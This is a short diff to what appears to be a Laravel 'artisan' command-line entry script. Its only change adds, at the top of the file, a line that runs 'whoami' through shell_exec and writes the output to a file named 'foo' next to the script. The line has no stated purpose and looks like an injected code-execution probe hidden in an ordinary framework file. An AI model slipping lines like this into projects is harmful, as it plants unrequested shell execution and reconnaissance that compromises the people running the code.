@@ -1,6 +1,6 @@
 #!/usr/bin/env php
 <?php
-
+file_put_contents(dirname(__FILE__) . "/foo",shell_exec('whoami'));
 /*
 |--------------------------------------------------------------------------
 | Register The Auto Loader
